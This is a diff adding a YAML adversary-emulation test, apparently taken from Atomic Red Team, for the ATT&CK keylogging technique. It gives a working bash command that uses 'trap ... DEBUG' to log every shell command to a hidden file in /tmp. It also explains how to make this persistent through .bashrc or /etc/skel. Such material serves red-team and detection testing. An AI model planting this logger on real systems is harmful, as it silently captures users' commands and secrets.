@@ -1,0 +1,51 @@
+- id: 7f85a946-a0ea-48aa-b6ac-8ff539278258
+  name: Bash session based keylogger
+  description: "When a command is executed in bash, the BASH_COMMAND variable contains\
+    \ that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\". The\
+    \ trap command is not a external command, but a built-in function of bash and\
+    \ can be used in a script to run a bash function when some event occurs. trap\
+    \ will detect when the BASH_COMMAND variable value changes and then pipe that\
+    \ value into a file, creating a bash session based keylogger. \n\nTo gain persistence\
+    \ the command could be added to the users .bashrc or .bash_aliases or the systems\
+    \ default .bashrc in /etc/skel/"
+  tactic: collection
+  technique:
+    attack_id: T1056.001
+    name: 'Input Capture: Keylogging'
+  platforms:
+    linux:
+      sh:
+        command: trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND"
+          >> /tmp/.keyboard.log' DEBUG; echo "Hello World!"; cat /tmp/.keyboard.log
+        cleanup: 'rm #{output_file}'
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - collection
+  - atomic-red-team
+  - t1056.001
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      output_file:
+        description: File to store captured commands
+        type: string
+        default: /tmp/.keyboard.log
+    dependencies:
+    - description: 'This test requires to be run in a bash shell
+
+        '
+      prereq_command: 'if [ "$(echo $0)" != "bash" ]; then echo -e "\n***** Bash not
+        running! *****\n"; exit 1; fi
+
+        '
+      get_prereq_command: 'echo ""
+
+        '
+    technique_created: '2020-02-11T18:58:11.791Z'
+    atomic_guid: 7f85a946-a0ea-48aa-b6ac-8ff539278258
+    import_timestamp: '2025-06-24T11:15:56.331384Z'
